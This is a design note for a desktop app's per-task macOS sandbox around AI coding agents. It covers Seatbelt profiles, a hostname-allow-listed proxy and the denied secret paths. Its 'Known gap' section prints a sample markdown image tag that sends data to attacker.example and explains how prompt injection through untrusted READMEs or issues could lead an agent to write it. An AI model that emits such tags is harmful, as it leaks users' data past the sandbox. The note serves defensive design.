# Sandbox

`src-tauri/src/sandbox.rs` + `TaskSandboxDialog`. Per-task macOS sandbox-exec (Seatbelt) + per-task in-process HTTPS CONNECT proxy (`src-tauri/src/proxy.rs`).

## Scope

ONLY the agent CLI's PTY is sandboxed. AuxTerminal, setup script, run script, and archive script run unsandboxed by design — they're user-authored shell needing full reach. The carve-out is enforced by not passing `task_id` in `pty_spawn` / routing scripts through `run_script` which never calls `sandbox::provision`.

## Modes (`SandboxMode`)

Four states, set per-task at create + editable later. `Enforce` is the full cage and is intentionally never weakened.

- **Off** — no cage.
- **Monitor** — allow everything, LOG every file op + network request.
- **Enforce** — full cage: seatbelt FS allow-list **and** network pinned to the loopback proxy.
- **EnforceFs** (serialized `"enforce-fs"`, UI "ENFORCING (FS)") — the **filesystem cage only**. Identical FS allow-list to `Enforce`, but the network sandbox is OFF: `render_profile` emits `(allow network*)` and `provision` starts **no proxy** (so `wrap_command` injects no `http_proxy`). For users who want write/read isolation but unrestricted egress (their own egress controls, VPN, non-HTTP traffic). UI consequence: every network surface is hidden in this mode (host allow-list field in both dialogs, "Blocked hosts" section + "+ domains" copy in the footer activity popover) — only FS rows show. YOLO auto-on (the FS seatbelt is still the real boundary), accent-colored shield.

## Layered model

1. `sandbox-exec -f <profile.sb>` — kernel seatbelt. Profile rendered to `$TMPDIR/termic-sandbox-<wsId>.sb`. Allows broad `file-read*`, narrow `file-write*` on task + agent dirs + caches. Secrets (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.config/gh/hosts.yml`, Keychains) ALWAYS denied. `(deny network*)` except loopback to the proxy — UNLESS `EnforceFs`, which emits `(allow network*)` instead.
2. Per-task **in-process CONNECT proxy** on an OS-assigned port (Rust thread inside Tauri binary). Regex hostname allowlist per CLI: claude→anthropic, gemini→google, codex→openai + baseline (github, npmjs, pypi, crates.io, CA OCSP) + task extras. Non-matching → HTTP 403. Stopped via `SandboxBundle::Drop` on PTY teardown. **Not started in `EnforceFs`** (no network sandbox).

## Key behaviors

- **Pinning**: `Task.sandbox_enabled` captured at create time. Edit later via `task_set_sandbox`, which persists AND SIGKILLs every live PTY (otherwise the running process holds the old profile). `TaskSandboxDialog` warns before save.
- **YOLO interaction**: when `ws.sandbox_enabled`, spawn args always include `yolo_args` regardless of global YOLO toggle — the seatbelt is the real boundary. Toolbar `Zap`: OFF→gray, ON+sandboxed→green, ON+unsandboxed→red+pulsing+warning tooltip. Code in `UnifiedBar.tsx`.
- **Default sets** baked into Rust (`builtin_rw_paths`/`builtin_deny_paths`, per-CLI `render_filter` in `sandbox.rs`). Project `sandbox_*` fields are extras only, seeded at task creation.
- **Recent denies**: `task_recent_denials(id, minutes?)` shells to `log show` filtered to task path + "deny". Surfaced in sandbox dialog under lazy `<details>`.

## Known gap: the webview is outside the cage

The seatbelt + CONNECT proxy cage the **agent process**. They do not cage the
**webview**, which makes its own network requests as the app itself. Anything
the webview can be made to fetch is egress the proxy allowlist never sees.

There is one such path today, accepted deliberately (#65): `img-src` in
`tauri.conf.json` allows any `https:` origin, so the markdown preview renders
remote images. Previewing

```markdown
![](https://attacker.example/x.png?d=<data>)
```

fires a GET to an arbitrary host on render, with no click and no prompt, even
when the workspace is in `Enforce` and the agent itself cannot reach that host.

The realistic trigger is not a scheming agent, it is **prompt injection plus
untrusted markdown**. An agent reads a dependency's README, a GitHub issue, or a
fetched page, and that text tells it to write the image tag. The same applies to
markdown the agent never touched: a contributor's fork, a submodule, a vendored
package. Only a GET is possible (no script: `script-src 'self'`, markdown-it runs
with `html:false` and blocks `javascript:`), so the payload is limited to what
the markdown's author can encode in a URL, plus the viewer's IP, user-agent, and
timing. GitHub and VS Code make the same tradeoff for their previews.

If this ever needs closing, the shape is a default-off "load remote images"
preference gating hydration (tracked in #69), not a CSP tweak: Tauri's CSP is
one policy for the whole webview and cannot be scoped to a component.

**Before widening the CSP again, remember it is app-wide.** `connect-src` or
`script-src` would be materially worse than `img-src` is.

## Do NOT

- Sandbox AuxTerminal, setup, run, or archive scripts.
- Expose `task_set_sandbox` without SIGKILLing live PTYs by default. `kill_live=false` is an explicit escape hatch with a warning — don't make it the default.
- Widen `tauri.conf.json`'s CSP without reading "Known gap" above. It applies to the whole webview, not to the component you are working on.
